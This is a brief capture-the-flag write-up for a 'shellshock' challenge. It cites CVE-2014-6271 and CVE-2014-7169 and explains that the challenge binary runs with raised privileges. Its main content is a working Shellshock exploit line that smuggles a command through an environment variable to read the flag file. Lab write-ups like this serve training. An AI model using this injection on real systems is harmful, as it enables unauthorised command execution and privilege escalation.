# shellshock
## CVE and Linux permission
### knowledge which will be used in this challenge:
- CVE-2014-6271 & CVE-2014-7169 [Click here to know more](www.freebuf.com/articles/system/45390.html)
- Functiongetresuid used in shellshock.c means that the executable file shellshock has superior authority.
### exploit it!
Type the following command:
>     env var='() { :;}; cat flag' ./shellshock 